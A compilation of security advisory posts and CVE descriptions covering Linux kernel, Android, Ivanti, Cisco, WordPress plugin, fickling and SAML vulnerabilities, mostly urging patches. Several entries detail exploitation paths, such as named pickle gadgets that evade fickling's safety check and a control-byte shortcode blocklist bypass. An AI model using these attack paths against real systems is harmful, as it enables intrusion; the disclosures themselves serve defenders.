posts.content:
Researcher Mark B disclosed Android CVE-2026-58882, dubbed 'SMS of Death.' A hidden WAP Push message can crash calling services with no tap; repeated delivery may cause reboot loops. This is denial of service, not device takeover.

An AOSP fix exists, but public bulletin timing and manufacturer rollout remain uncertain. Admins: inventory Android versions and verify device updates.

https://smsofdeath.com/

#Cybersecurity #Infosec #AndroidSecurity #PatchManagement

🚨 ANDROID'S “SMS OF DEATH” 🚨

Technical breakdown 👇 https://thecybersecguru.com/exploits/cve-2026-58882-android-sms-of-death-explained/

An 8-BYTE SMS. Zero clicks. No notification. Your phone's calling service CRASHES.

CVE-2026-58882 exposes a dangerous flaw in Android's telephony framework that can:

📵 Kill active calls, including emergency calls
💀 Crash http://com.android.phone remotely
🔁 Trigger repeated crashes and boot loops
📱 Potentially leave devices unusable

The culprit? An unchecked integer conversion in Android's WAP Push parser.

Even worse, the message can bypass your normal SMS inbox entirely.

How does an 8-byte payload bring Android to its knees?

#AndroidSecurity #CyberSecurity

posts.content:
@thilo CVE-2026-98432 requires close monitoring because it is a remotely trigger-able Linux kernel use-after-free vulnerability with demonstrated root-level exploitation.

Although kernel fixes exist upstream, they are not yet available or deployed across all distributions and supported kernel versions.

The demonstrated exploit currently requires MPTCP, but the underlying vulnerability affects ordinary TCP as well.

A use-after-free has already been demonstrated without MPTCP, although a complete exploit chain has not.

Disabling MPTCP is therefore not a reliable security boundary. It is a bandage.

A working exploit (which is not impossible) against ordinary TCP listeners could suddenly and dramatically expand the attack surface, potentially exposing virtually any unpatched Linux server running a reachable TCP service.

The key uncertainty is not whether ordinary TCP is vulnerable, but how far an attacker can exploit it. That makes continued attention essential.

Linux CVE-2026-98432 is a TCP use-after-free. Anthropic demonstrated remote root against an MPTCP listener in a lab, not known in-the-wild exploitation. The underlying flaw is not limited to MPTCP.

Go 1.24+ enables MPTCP on Linux listeners by default. Inventory exposed services, check distro advisories and deploy fixed kernels.

https://www.anthropic.com/research/discovering-vulnerabilities-with-claude

posts.content: CVE-2026-98432: Linux IPv4 UAF https://nvd.nist.gov/vuln/detail/cve-2026-98432

CVE-2026-98432: Linux IPv4 UAF

Linux 커널의 IPv4 TCP 연결 처리에서 SYN 재전송과 소켓 해제가 동시에 발생하면 use-after-free가 발생할 수 있는 CVE-2026-98432가 공개됐다. kernel.org는 CVSS 3.1 기준 9.8점으로 평가했으며, NVD 자체 평가는 아직 제공되지 않았다. 패치는 옵션 메모리 해제에 kfree_rcu()를 적용해 RCU 유예 기간을 보장한다. AI 인프라 운영자는 사용 중인 커널과 배포판의 수정 여부를 확인하고 업데이트해야 한다. 유사한 IPv6 요청 소켓 마이그레이션 문제는 별도 패치로 처리될 예정이다.

https://nvd.nist.gov/vuln/detail/cve-2026-98432

posts.content:
@thilo CVE-2026-98432 requires close monitoring because it is a remotely trigger-able Linux kernel use-after-free vulnerability with demonstrated root-level exploitation.

Although kernel fixes exist upstream, they are not yet available or deployed across all distributions and supported kernel versions.

The demonstrated exploit currently requires MPTCP, but the underlying vulnerability affects ordinary TCP as well.

A use-after-free has already been demonstrated without MPTCP, although a complete exploit chain has not.

Disabling MPTCP is therefore not a reliable security boundary. It is a bandage.

A working exploit (which is not impossible) against ordinary TCP listeners could suddenly and dramatically expand the attack surface, potentially exposing virtually any unpatched Linux server running a reachable TCP service.

The key uncertainty is not whether ordinary TCP is vulnerable, but how far an attacker can exploit it. That makes continued attention essential.

posts.content:
Linux Kernel TCP Flaw Allows Remote Root Access

A critical race condition in the Linux kernel TCP stack (CVE-2026-98432) allows remote attackers to gain root access.

**If you run Linux servers (Ubuntu, RHEL, SUSE, Amazon Linux 2 and others), install your vendor's fixed kernel as soon as it's out and reboot. Updating containers alone won't help, because they run on the host's kernel. Until the patch arrives, block incoming IPv4 TCP packets that carry IP options at the firewall, and turn off Multipath TCP (MPTCP) wherever you don't need it, starting with your internet-facing servers.**
#cybersecurity #infosec #advisory #vulnerability

posts.content:
For all my self-hosting friends using netbird:
There's a Linux kernel bug being tracked as CVE-2026-98432 that can lead to unauthenticated remote code execution when malicious traffic hits a vulnerable TCP socket.

This affects netbird in its standard configuration when Traefik is used, because Go automatically enables MPTCP by default.

Go Security team warns that disabling MPTCP is not a complete fix. Linux kernel update + system restart is necessary.

If you're using Ubuntu there is currently no kernel update available¹.
All Debian Security Releases report that there's a fix version available².

https://www.cve.org/CVERecord?id=CVE-2026-98432

¹ as of 30.10.26 12:24 (https://ubuntu.com/security/CVE-2026-98432)

² https://security-tracker.debian.org/tracker/CVE-2026-98432

CVE-2026-98432.description:
In the Linux kernel, the following vulnerability has been resolved:

ipv4: free inet_opt and ireq_opt after an RCU grace period

tcp_v4_syn_recv_sock() transfers ownership of ireq->ireq_opt to the
child socket (newinet->inet_opt) without copying it.

Another cpu can concurrently process a retransmitted SYN for the same
request socket, and send a SYNACK from tcp_check_req().
tcp_v4_send_synack() and inet_csk_route_req() read ireq->ireq_opt
under rcu_read_lock() only, and ip_build_and_send_pkt() and
ip_options_build() then read opt->optlen twice.

Note that the SYNACK timer itself is not an issue: it holds a
reference on its request socket, and inet_csk_reqsk_queue_drop()
calls timer_delete_sync() before the child can be freed.

Since commit 079096f103fa ("tcp/dccp: install syn_recv requests
into ehash table"), request sockets are processed without holding
the listener lock, so nothing prevents the child socket from being
freed while the SYNACK is still being built. TCP child sockets do
not have SOCK_RCU_FREE, and inet_sock_destruct() frees inet_opt
with a plain kfree(), leading to a use-after-free in
ip_options_build().

A similar issue exists with request socket migration
(net.ipv4.tcp_migrate_req=1, or a BPF_SK_REUSEPORT_SELECT_OR_MIGRATE
program). reqsk_timer_handler() clones the request socket with
inet_reqsk_clone(), so that the old request socket and its clone
share the same ireq_opt, then reqsk_migrate_reset() clears the
pointer in the old one. Another cpu holding a reference on the old
request socket can still be using these options (sending a SYNACK,
or creating a child in tcp_v4_syn_recv_sock()) when the clone is
freed, and tcp_v4_reqsk_destructor() also uses a plain kfree().

Readers already use RCU, and other paths replacing inet_opt
(do_ip_setsockopt(), cipso_v4_sock_setattr()...) already use
kfree_rcu(). Use kfree_rcu() in inet_sock_destruct() and
tcp_v4_reqsk_destructor() as well.

IPv6 is not affected by the first issue, because tcp_v6_syn_recv_sock()
duplicates the options. tcp_v6_reqsk_destructor() has the same
migration issue with ipv6_opt, which is only set by CALIPSO. This
will be addressed in a separate patch.

CVE-2026-62297.description: ag-psd is a JavaScript library for reading and writing Photoshop Document files. Before the allocation-limit remediation attempt in version 31.0.0, `readPsd()` commits image and layer buffers from attacker-declared PSD geometry before validating the declarations against the actual available data or sane allocation limits. The `psdReader.js` implementation sizes off-heap typed arrays using `width`, `height`, `channels`, `depth` and `per-layer rectangles`, so a tiny PSD declaring enormous geometry can force multi-gigabyte memory allocation before a later bounds error. The reported 52-byte input on Node 24 produced approximately 3.17 GB peak RSS before a RangeError; under memory pressure the process can be terminated before the error can be caught, and concurrent inputs can exhaust memory. Services reading untrusted PSDs are exposed to denial of service. This differs from genuinely large PSD files whose memory demand is proportional to real input content. Version 31.0.0 adds a composite-image allocation limit, but complete coverage of the separately described layer-rectangle allocation path is not established and requires curator residual/scope review.

CVE-2026-62958.description: libriscv is a RISC-V sandbox and emulator. Prior to 1.18, a crafted ELF binary can cause out-of-bounds reads in the host emulator. `Memory<W>::binary_loader` checks `PT_LOAD` program-header bounds, but `Memory<W>::serialize_execute_segment` trusts section-header `sh_offset` and `sh_size` when locating `.text` without verifying the file range against `m_binary.size()`; `Memory<W>::lookup()` has a similar section-table problem. Malformed `.text` or `.symtab` offsets can therefore bypass the program-header checks and point outside the binary buffer, crashing rvlinux. With suitable memory layout or integer overflow, out-of-buffer host heap memory may instead be mapped into the guest by `create_execute_segment()`, potentially exposing host memory. The reported reproducer demonstrates a host SIGSEGV, while memory disclosure through grooming is described as possible rather than demonstrated. This issue is fixed in version 1.18.

posts.content:
CISA Adds Fragnesia Linux Kernel Flaw to KEV Catalog Following PHP2Shell Chain Reports

CISA added the Fragnesia Linux kernel flaw (CVE-2026-46300) to its KEV catalog after reports of it being chained with PHP2Shell for remote root access. The vulnerability allows local users to overwrite in-memory system files to gain full administrative control.

**Make sure all industrial devices, especially Siemens SIMATIC S7-1500 CPUs, and your PAN-OS management interfaces are cut off from the internet and can only be reached from trusted networks. Then install the patched Linux kernel and reboot, and update PHP to 8.5.12 or 8.4.27. If you can't update, block the esp4 and esp6 kernel modules until you can.**
#cybersecurity #infosec #advisory #vulnerability

Frissítsetek és zárjátok a menedzsment interfészeket. #CVE-2026-109618 #CVE-2026-46300 #Firewall #ActiveDirectory https://linuxmint.hu/hir/2026/10/lancolt-php2shell-sebezhetoseg-25-szervert-rootolt-meg

CVE-2026-46300.description:
In the Linux kernel, the following vulnerability has been resolved:

net: skbuff: preserve shared-frag marker during coalescing

skb_try_coalesce() can attach paged frags from @from to @to.  If @from
has SKBFL_SHARED_FRAG set, the resulting @to skb can contain the same
externally-owned or page-cache-backed frags, but the shared-frag marker
is currently lost.

That breaks the invariant relied on by later in-place writers.  In
particular, ESP input checks skb_has_shared_frag() before deciding
whether an uncloned nonlinear skb can skip skb_cow_data().  If TCP
receive coalescing has moved shared frags into an unmarked skb, ESP can
see skb_has_shared_frag() as false and decrypt in place over page-cache
backed frags.

Propagate SKBFL_SHARED_FRAG when skb_try_coalesce() transfers paged
frags.  The tailroom copy path does not need the marker because it copies
bytes into @to's linear data rather than transferring frag descriptors.

posts.content:
CISA Flags Two Exploited Ivanti Connect Secure Flaws That Give Attackers Root Access

CISA has added Ivanti Connect Secure vulnerabilities (CVE-2026-111357, CVE-2026-118527, and CVE-2026-104935) to its KEV catalog following reports of active exploitation. These flaws allow attackers to chain exploits to gain root access, upload malicious files, and compromise entire enterprise networks.

**If you run Ivanti Connect Secure VPN, upgrade right away to version 25.1.1.3 or 22.8R2. Attackers are chaining three flaws to take full control of the appliance, and older builds are still exposed even if you patched earlier in October. Treat any internet-facing appliance as possibly already compromised: after upgrading, change all passwords, API tokens and certificates stored on or reachable from the VPN, and check your Active Directory for suspicious accounts.**
#cybersecurity #infosec #attack #activeexploit

posts.content:
🚨 Attackers chain three Ivanti Connect Secure flaws for unauthenticated root access

A previously unknown threat actor tracked as UTA0576 exploited three vulnerabilities to compromise fully patched Ivanti Connect Secure VPN appliances and execute commands as root without authentication.
⠀
• CVE-2026-104935: Authentication bypass and RCE - CVSS 8.6
• CVE-2026-111357: Privilege escalation - CVSS 8.8
• CVE-2026-118527: Predictable identifier allowing controlled file uploads - CVSS 4.3
• Affected: ICS 25.1.1.2 and earlier, and 22.8R2.5 and earlier
• Fixed: ICS 25.1.1.3 and 22.8R2.6
⠀
The actor extracted VPN and Active Directory credentials, searched for LAPS passwords and BitLocker recovery keys, conducted password spraying and deleted evidence from system logs.

CISA has added all three vulnerabilities to its Known Exploited Vulnerabilities catalog.

Source: https://www.volexity.com/blog/2026/10/13/a-series-of-unauthenticated-events-chained-exploitation-of-ivanti-connect-secure-zero-days/

• CVE-2026-104935: Authentication bypass and RCE - CVSS 8.6
• CVE-2026-111357: Privilege escalation - CVSS 8.8
• CVE-2026-118527: Predictable identifier allowing controlled file uploads - CVSS 4.3
• Affected: ICS 25.1.1.2 and earlier, and 22.8R2.5 and earlier
• Fixed: ICS 25.1.1.3 and 22.8R2.6
⠀
The actor extracted VPN and Active Directory credentials, searched for LAPS passwords and BitLocker recovery keys, conducted password spraying and deleted evidence from system logs.

• Affected: Chrome for macOS before 155.0.8059.39

CVE-2026-62864.description: Ring is a Clojure web applications library inspired by Python's WSGI and Ruby's Rack. Prior to 1.15.5, `wrap-nested-params` in the `ring.middleware.nested-params` namespace uses a backtracking regular expression to match parameter names from URL query strings and HTTP request bodies. An attacker can craft a parameter name that drives quadratic O(n^2) matching work, causing regular-expression denial of service in applications using the middleware. `Ring-Defaults` users are also exposed because nested-params is enabled by default. Applications omitting the middleware do not expose this parsing path. This issue is fixed in version 1.15.5.

phpMyAdmin -- Multiple vulnerabilities, no fix available

```Seven vulnerabilities in phpMyAdmin up to and including 5.2.3 were published on 2026-10-30. The most severe of them, an authentication bypass, is in the WebAuthn second factor: assertion signatures are never verified against the stored public keys, so an attacker who already has the MySQL credentials of a victim can skip the second factor.

The others are a server-side request forgery in setup/validate.php, which needs no authentication at all and can be used to probe internal hosts and ports; the removal of two- factor authentication without re-authentication; SQL injection in Central Columns and in the Designer, both running with controluser privileges; stored cross-site scripting in the Designer history; and a missing cross-site request forgery token.

There is no fixed release. The phpMyAdmin project has published neither a security announcement nor a new version, and only the request forgery has a fix in the development branch so far.```

CVE-2026-104012.description: The Rox Appointment Booking – Appointment Booking Scheduling Solution plugin for WordPress is vulnerable to Privilege Escalation via Mass Assignment in all versions up to, and including, 1.3.1 This is due to the public `/rox-appointment-booking/v1/public/booking` REST endpoint performing mass-assignment of the raw request body into a new customer row while `CustomerModel::$fillable` includes the internal `wp_user_id` column, allowing an unauthenticated attacker to persist an arbitrary WordPress user ID alongside an attacker-controlled email address with no authorization check. When an administrator subsequently opens the poisoned customer record and clicks Update Customer, `SaveCustomer::handleRequest()` passes the stored `wp_user_id` and attacker-supplied email to `wp_update_user()` — succeeding because `LinkedAccount::canChange()` unconditionally returns true when the acting user holds the `edit_users` capability — thereby overwriting the targeted administrator's email address and enabling full account takeover via a standard WordPress password-reset request. Successful exploitation requires an administrator to open and save the poisoned record, and the attacker must know or guess a valid administrator user ID (such as the default user ID 1).

posts.content:
Ivanti oh no bb what is u doin?

At the time of discovery of exploitation, Ivanti had a fix developed for CVE-2026-104935 which was already in QA for supported versions, and we made the decision to not delay getting a fix to customers that resolved the primary exploitation path when the LPE was discovered. Because of this, our focus was initially centered on the disclosure of CVE-2026-104935 and providing protection for our customers as quickly as possible. Additionally, Ivanti collaborated with Volexity on their blog post which provided information to arm defenders on known threat actor behavior, including chaining the local privilege escalation vulnerability. These additional CVE disclosures have now been added to this Security Advisory and a fix is available now.

New Ivanti zero-days: CVE-2026-111357 (missing authentication) and CVE-2026-118527 (predictable filenames)

We are aware of exploitation in the wild affecting a limited number of customers at the time of disclosure when CVE-2026-104935, CVE-2026-111357 and CVE-2026-118527 are chained.

https://hub.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-CVE-2026-104935?language=en_US

CVE-2026-103898.description: The Wp Social Login and Register Social Counter plugin for WordPress is vulnerable to Authentication Bypass in all versions up to, and including, 3.2.2. This is due to the social login REST callback registered at `/wp-json/wslu-social-login/type/{provider}/` with `permission_callback => __return_true` locating an existing WordPress account solely by the email string returned from the OAuth provider and calling `wp_set_auth_cookie()` without a password check, while the only verification guard — `!empty($getProfile->emailVerified)` in `inc/admin-create-user.php` — is a no-op for the bundled Hybridauth Facebook and Twitter adapters, both of which assign the raw email string rather than a boolean verified flag to `emailVerified`. This makes it possible for unauthenticated attackers to obtain a fully authenticated session as any existing WordPress user, including Administrators, whose registered email address can be presented through a configured Facebook or Twitter login on the target site. Exploitation requires only that the attacker control an OAuth account whose provider-returned email matches the target account's registered WordPress email address; no local credentials, nonce, or prior foothold is needed.

CVE-2026-120070.description: The User Frontend – Membership, User Registration, User Profile, User Directory & Content Restriction with Frontend Post Submission plugin for WordPress is vulnerable to Privilege Escalation in all versions up to, and including, 4.3.13 via the `post_content` parameter of the `submit_post()` function. The vulnerability exists because the protected-shortcode blocklist guard inspects the `sanitize_textarea_field()` copy of the submitted `post_content`, while the copy actually persisted to the database is processed through `wp_kses()`, whose `wp_kses_no_null()` step strips C0 control bytes — allowing an attacker to inject a single `\x01` byte inside the `[wpuf-registration]` tag name to defeat the `strpos()` blocklist check while the clean, functional shortcode is stored verbatim; `strip_shortcodes()` does not neutralize the stored shortcode either, because the Frontend container that registers it via `add_shortcode()` is only instantiated when `is_admin()` is false, and `admin-ajax` requests have `is_admin() === true`. This makes it possible for authenticated attackers, with Subscriber-level access and above, to inject a `[wpuf-registration role="editor"]` shortcode into a published post, causing a live Editor-role registration form to be rendered publicly on the frontend that any visitor — or the attacker themselves — can submit to mint a WordPress Editor account with an immediately active privileged session when the default `autologin_after_registration` setting is enabled.

CVE-2026-119096.description: The Uncanny Toolkit for LearnDash plugin for WordPress is vulnerable to Authentication Bypass in versions up to, and including, 3.8.2 via the `email` parameter of the `uo_login_action()` function. This is due to a parser-differential flaw in which the plugin's account-verification gate resolves the submitted `email` value using the raw, unsanitized string passed to `get_user_by()`, while the subsequent `wp_signon()` call relies on WordPress core's internal `sanitize_user()` to strip appended junk characters — causing the gate lookup to fail and be skipped entirely while the real account is still resolved and authenticated. This makes it possible for unauthenticated attackers to log in to unverified or administrator-suspended accounts whose credentials they already possess, obtaining a valid `wordpress_logged_in` session cookie and defeating the plugin's account-approval and account-suspension controls. The nonce required to reach the handler is freely obtainable in the same request from the unauthenticated `ult-refresh-nonce` endpoint, making exploitation trivial for any attacker with network access to the site and knowledge of a target account's credentials.

This is due to unrestricted mass assignment of caller-supplied meta_data keys onto the image model combined with missing realpath containment in path construction and a bypassable signature check on the public image delivery route. CVE-2026-118235.description: The SimpleForm – Form Maker to Chat Apps with Quiz, Poll and Multi Lead Notifications plugin for WordPress is vulnerable to Arbitrary File Upload in all versions up to, and including, 3.10.2 via the handle_upload function. This is due to missing server-side file key allowlist and pre-sanitization extension derivation that allows a trailing-dot filename to bypass all extension and MIME validation in handle_upload. This makes it possible for unauthenticated attackers to upload files that may be executable, which makes remote code execution possible. The only access control is a nonce that is printed into every public form's data-nonce attribute, making it trivially obtainable by any unauthenticated visitor on a page embedding the form shortcode.

posts.content:
🚨 TeamViewer flaw lets remote hosts attack the computers controlling them

CVE-2026-111585 allows a malicious or compromised host to crash the TeamViewer client used to control it and, depending on the viewer’s operating system, potentially execute arbitrary code.

The vulnerability is triggered after a user establishes a remote-control session. A manipulated screen-size value causes an integer overflow, resulting in memory being written outside its allocated buffer.
⠀
• CVSS: 8.8
• Affected: TeamViewer Full Client on Windows, macOS and Linux, Windows Portable and Android Remote Control before 15.83
• Fixed: TeamViewer 15.83 or later
• Exploited: No known attacks

Researchers demonstrated code execution against a Windows viewer, although the proof required part of the attack data to be supplied locally and was not a fully remote exploit.

TeamViewer has provided no workaround. Users should update immediately.

Source: https://www.teamviewer.com/en/resources/trust-center/security-bulletins/tv-2026-1011/

posts.content:
Cisco Patches Actively Exploited Firewall Zero-Day

Cisco patched a high-severity zero-day vulnerability (CVE-2026-76418) in ASA and FTD software that allows unauthenticated attackers to remotely crash SSL VPN devices. The flaw is part of a series of targeted attacks against Cisco infrastructure.

**If you run Cisco ASA or FTD firewalls with SSL VPN and secondary authentication turned on, upgrade to a fixed software ASAP. Attackers are already using this flaw to crash firewalls and cut off remote users. If you can't patch, disable secondary authentication on your VPN tunnel groups with the `no secondary-authentication-server-group` command until the upgrade is done.**
#cybersecurity #infosec #attack #activeexploit
https://beyondmachines.net/event_details/cisco-patches-actively-exploited-firewall-zero-day-6-l-5-m-3/gD2P6Ple2L

CVE-2026-76418.description: A vulnerability in the Remote Access SSL VPN service of Cisco Secure Firewall Adaptive Security Appliance (ASA) Software and Cisco Secure Firewall Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to cause the device to reload unexpectedly, resulting in a denial of service (DoS) condition. This vulnerability is due to logic errors when secondary authentication is configured on a tunnel group. An attacker could exploit this vulnerability by sending a crafted request when connecting to the SSL remote access VPN. A successful exploit could allow the attacker to cause the affected device to reload, resulting in a DoS condition.

CVE-2026-109220.description: The PDF Invoice for WooCommerce + Drag and Drop Template Builder plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 7.1.1 via the 'customer_note' parameter parameter. This is due to insufficient sanitization of the customer_note checkout field, which is inlined verbatim into invoice HTML, entity-decoded back into a live tag by simplehtmldom, reassembled into raw bytes by mPDF, and passed to unserialize() in _getObjAttr without validation. This makes it possible for unauthenticated attackers to execute code on the server. An unauthenticated attacker can trigger the vulnerable code path on a default install by placing an anonymous WooCommerce checkout via the public Store API (POST /wc/store/v1/checkout) using a Direct Bank Transfer or cheque payment method, which automatically transitions the order to 'on-hold' status and fires the plugin's invoice-generation hook.

CVE-2026-62967.description: ZTNET is a ZeroTier web UI for private controllers with multiuser and organization support. Prior to 0.8.0, any authenticated low-privilege user can permanently deactivate another account, including an administrator, through `POST /api/auth/user/invalidateUser`. In `src/pages/api/auth/user/invalidateUser.ts`, `getServerSession` checks only that a session exists and does not compare `session.user.id` with the client-supplied `userId`. Supplying a victim's `userId` and a `deviceId` for which no matching pair exists in `UserDevice` makes the handler set the target account's `isActive` to false. Login is then refused by `src/server/auth.ts` with `account-expired`. An attacker needs only a normal authenticated account and the victim's user ID, which may be obtainable from member lists, UI responses, logs, or other application metadata. This can lock administrators out, disrupt organization management, and deny access to any targeted user. This issue is fixed in version 0.8.0.

Aedes is an MQTT broker that can run on any stream server. Prior to 1.1.1, the MQTT broker does not bound topic depth or structural complexity before passing topics through `mqemitter` into `qlobber`. A `PUBLISH`, `SUBSCRIBE`, or registered `Will`...

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-63341.description: Aedes is an MQTT broker that can run on any stream server. Prior to 1.1.1, the MQTT broker does not bound topic depth or structural complexity before passing topics through `mqemitter` into `qlobber`. A `PUBLISH`, `SUBSCRIBE`, or registered `Will` message containing an excessively deep topic can reach `qlobber._split_words` in `lib/qlobber.js` and trigger an uncaught `too many words` exception. Calls from `handlers/subscribe.js` and the publishing logic are not protected against that exception, so it escapes to the `Node.js event loop` and terminates the entire broker. The `Will` path is independently reachable when a client disconnects ungracefully: it calls `broker.publish` directly and bypasses the `PUBLISH` handler. An attacker must be able to establish an `MQTT session`, authenticated or unauthenticated according to broker configuration. A successful attack disconnects all legitimate clients and prevents reconnection until the broker process restarts. This issue is fixed in version 1.1.1.

🟠 CVE-2026-16760 - High (8.8)

In Trail of Bits fickling through 0.1.12, the _process_import() method in fickle.py adds an imported name to the likely_safe_imports set whenever the source module is present in sys.stdlib_module_names and the name is absent from the UNSAFE_IMPORT...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-16760/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-16760.description: In Trail of Bits fickling through 0.1.12, the _process_import() method in fickle.py adds an imported name to the likely_safe_imports set whenever the source module is present in sys.stdlib_module_names and the name is absent from the UNSAFE_IMPORTS denylist, without inspecting what the name resolves to or how it behaves. The OvertlyBadEvals analysis pass in analysis.py then unconditionally skips any call whose function name appears in likely_safe_imports, including calls that would otherwise be flagged as overtly dangerous. As a result, any callable reachable through a non-blocked standard library module inherits module-level trust regardless of its own behavior, and check_safety() returns LIKELY_SAFE with zero findings for pickle payloads that reach code execution or file write through such callables. Demonstrated primitives: dataclasses._create_fn, which passes an attacker-controlled function body to exec() and yields arbitrary code execution on Python 3.7 through 3.12 (the internal _create_fn function was removed in Python 3.13); mailcap.findmatch, which internally calls os.system() on a test command taken from an attacker-controlled caps dictionary, yielding arbitrary code execution on Python versions through 3.12 (the mailcap module was removed in Python 3.13); and readline.add_history() followed by readline.write_history_file(), which writes attacker-controlled content to an arbitrary filesystem path (POSIX platforms, where the readline module is available). fickling.load() chains check_safety() into pickle.loads() as an explicit security gate, so a LIKELY_SAFE verdict causes the payload to be deserialized and executed with the privileges of the victim process. The root cause is the inference of callable safety from module origin; it is independent of, and separately fixable from, the dotted __qualname__ resolution weakness tracked as CVE-2026-118938, which this advisory does not address. As of 2026-10-30 the three demonstrated modules were added to UNSAFE_IMPORTS on the vendor master branch (commit d011709) pending release; released versions through 0.1.12 remain affected, and the module-origin trust root cause persists, as demonstrated by the related CVE-2026-118938 remaining exploitable on that same build.

In Trail of Bits fickling through 0.1.12, a pickle STACK_GLOBAL operand carrying a dotted __qualname__ (for example "Values.read_file") is resolved by pickle's find_class through _getattribute to an arbitrary attribute path rather than to a module...

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-118938.description: In Trail of Bits fickling through 0.1.12, a pickle STACK_GLOBAL operand carrying a dotted __qualname__ (for example "Values.read_file") is resolved by pickle's find_class through _getattribute to an arbitrary attribute path rather than to a module-level function. Fickling records only the leading component of the name in its import tracking and renders the operation as a plain import (for instance, 'python -m fickling' displays it as 'from optparse import Values.read_file'), so the trailing attribute reference is never analyzed as a call. The OvertlyBadEvals analysis pass does not flag it, and check_safety() returns LIKELY_SAFE with zero findings. This allows an attacker to reach a class method that performs code execution: optparse.Values.read_file executes exec(open(filename).read(), vars), achieving arbitrary code execution when the crafted pickle is loaded through fickling.load(), which chains check_safety() into pickle.loads() as an explicit security gate. optparse is present in all current CPython 3.x releases (deprecated as of Python 3.13, not removed). This weakness is in the resolution and analysis of dotted attribute-path names, and is distinct from and independently fixable from the module-origin trust weakness tracked as CVE-2026-16760: resolving or flagging dotted attribute-path imports closes this vector while leaving the module-level trust behavior unchanged. This bypass was verified to remain present on the vendor master branch at commit d011709 as of 2026-10-30, after the vendor's October blocklist additions and a new heuristic that flags private stdlib attributes; because the public class method Values.read_file is neither blocklisted nor flagged as a private attribute, it is not addressed by those remediations.

LightSAML implements SAML 2.0 data model classes, XML serialization and deserialization, XML security, certificate support, and message bindings. Prior to 4.7.1 and 5.0.1, LightSAML and xmlseclibs disagree about which assertion an inbound SAML sig...

CVE-2026-63182.description: LightSAML implements SAML 2.0 data model classes, XML serialization and deserialization, XML security, certificate support, and message bindings. Prior to 4.7.1 and 5.0.1, LightSAML and xmlseclibs disagree about which assertion an inbound SAML signature covers. `Response::deserialize` uses `manyElementsFromXml` to collect only direct-child `saml:Assertion` elements of `samlp:Response`, and `AssertionSignatureValidatorAction` validates their `ds:Signature` using an out-of-band trusted IdP credential resolved by Issuer, not a key from the document. `XMLSecurityDSig::validateReference()` removes the enveloped signature from the shared DOM, but `processRefNode()` resolves `Reference URI="#id"` document-wide through an XPath of the form `//*[@Id]` and takes `item(0)`, which need not be the assertion whose claims LightSAML consumes. An attacker who has captured one genuinely signed assertion, such as an earlier login response, can place its signature-stripped bytes earlier in `samlp:Extensions` and present a forged direct-child assertion with the same ID and copied genuine signature. Validation then covers the hidden genuine bytes while LightSAML surfaces unsigned attacker-controlled `Subject/NameID`, `Conditions`, and `Attributes`, enabling authentication bypass or privilege escalation even when signature validation is required. The behavior was confirmed in versions 5.0.0 and 4.6.1. This issue is fixed in versions 4.7.1 and 5.0.1.

CVE-2026-103039.description: The Gravity Forms plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.1.2 via a Post Custom Field whose input type is List. This is due to GFFormsModel::create_post() passing the submitted value to WordPress' unrestricted global maybe_unserialize() rather than the plugin's own hardened GFCommon::maybe_unserialize(), which was added in 3.1.1 and passes allowed_classes => false precisely to prevent object instantiation. Where the field has a content template enabled, the submitted row reaches that call verbatim. This makes it possible for unauthenticated attackers to inject a PHP object into post meta. No PHP Object Injection gadget chain is present in the plugin itself; however, if a gadget chain is present via an additional plugin or theme, it could allow the attacker to perform actions such as remote code execution. Where the custom field is mapped to the protected _wp_page_template meta key, WordPress itself supplies the chain: validate_file() accepts non-scalars, WP_Theme::__toString() then resolves an attacker-controlled path, and on hosts with a readable PEAR install and register_argc_argv enabled this yields remote code execution.

CVE-2026-55598.description: PinePods is a complete, self-hosted podcast management system written in Rust. Prior to 0.9.0, an authenticated user can subscribe to an attacker-controlled RSS feed through `POST /api/data/add_podcast` in `rust-api/src/handlers/podcasts.rs`. `get_podcast_values` and `add_episodes` in `rust-api/src/database.rs` parse the feed with `feed-rs` and store the `<enclosure url>` verbatim in `Episodes.episodeurl` without destination host/IP validation. `POST /api/data/download_podcast` invokes `spawn_download_podcast_episode` and `download_episode_and_wait()` in `rust-api/src/services/tasks.rs`, which sends a `reqwest` GET to the stored URL and saves and records the response in `DownloadedEpisodes` for later retrieval. The `estimate_duration_from_audio_url_async()` path in `rust-api/src/database.rs` also sends an unvalidated HEAD during feed add/refresh. Default redirect following permits an initially external enclosure URL to redirect to an internal target. A low-privilege user can make server-side GET/HEAD requests to reachable loopback, private-network and cloud metadata services and read downloaded internal responses, enabling internal-service enumeration, confidential-data disclosure and possible metadata credential theft. Episode downloading requires server downloads to be enabled, which is the default; self-service signup is supported. This issue is fixed in version 0.9.0.

CVE-2026-61826.description: Bazarr is a companion application to Sonarr and Radarr. Prior to 1.5.7-beta.14, the `api_ns_plex` namespace in `bazarr/api/plex/oauth.py` omits `@authenticate` on its Resource handlers, while normal APIs require an API key and no global authentication hook compensates. Anonymous callers can invoke `POST /api/plex/oauth/logout` to clear credentials and disable the integration, or `POST /api/plex/apikey` to persist an attacker-selected key, without a PIN, account or state precondition. `POST /api/plex/oauth/pin` and `GET /api/plex/oauth/pin/<pin_id>/check` additionally allow an attacker who completes a PIN with an attacker-controlled Plex account to bind that account's token to the instance. `PlexPinCheck` skips state validation when `state_param` is absent and merely logs a mismatch without stopping execution. `POST /api/plex/select-server`, `POST /api/plex/oauth/servers`, `POST /api/plex/webhook/create`, `POST /api/plex/webhook/delete` and `POST /api/plex/encrypt-apikey` expose further `write_config()` operations. Attacker-controlled server URLs feed later outbound requests carrying the configured API key in `X-Plex-Token`, enabling server-side request forgery and credential exposure in addition to persistent configuration tampering and integration denial of service. Version 1.5.7-beta.14 closes the anonymous API-mutation path by adding authentication; complete OAuth state validation is not established and remains a separate residual for curator review.

CVE-2026-20127.description:
A vulnerability in the peering authentication in Cisco Catalyst SD-WAN Controller, formerly SD-WAN vSmart, and Cisco Catalyst SD-WAN Manager, formerly SD-WAN vManage, could allow an unauthenticated, remote attacker to bypass authentication and obtain administrative privileges on an affected system.

